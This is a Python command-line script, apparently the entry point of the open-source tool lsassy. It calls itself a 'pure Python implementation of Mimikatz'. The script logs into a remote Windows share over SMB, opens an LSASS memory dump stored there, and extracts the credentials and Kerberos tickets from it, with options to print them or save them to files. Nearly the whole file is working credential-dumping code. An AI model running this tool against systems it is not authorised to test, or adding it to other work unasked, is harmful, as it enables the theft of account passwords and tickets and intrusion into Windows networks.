#!/usr/bin/env python3
#
# Author:
#  Romain Bentz (pixis - @hackanddo)
# Website:
#  https://beta.hackndo.com

import pkg_resources
from pypykatz.pypykatz import pypykatz
from pypykatz.lsadecryptor.cmdhelper import LSACMDHelper
from lsassy.impacketconnection import ImpacketConnection
from lsassy.impacketfile import ImpacketFile

version = pkg_resources.require("lsassy")[0].version

def run():
    import argparse
    parser = argparse.ArgumentParser(description='Pure Python implementation of Mimikatz --and more--')
    parser.add_argument('--json', action='store_true',help = 'Print credentials in JSON format')
    parser.add_argument('-k', '--kerberos-dir', help = 'Save kerberos tickets to a directory.')
    parser.add_argument('-g', '--grep', action='store_true', help = 'Print credentials in greppable format')
    parser.add_argument('-o', '--outfile', help = 'Save results to file (you can specify --json for json file, or text format will be written)')
    parser.add_argument('-d', '--debug', action='store_true', help = 'Debug output')
    parser.add_argument('target', action='store', help='[domain/]username[:password]@<host>:/shareName/path/to/lsass/dump')
    parser.add_argument('-V', '--version', action='version', version='%(prog)s (version {})'.format(version))
    args = parser.parse_args()
    conn, share_name, file_path  = ImpacketConnection.from_args(args, args.debug)
    ifile = ImpacketFile()
    ifile.open(conn, share_name, file_path)
    dumpfile = pypykatz.parse_minidump_external(ifile)
    LSACMDHelper().process_results({"dumfile": dumpfile}, [], args)

if __name__ == '__main__':
    run()
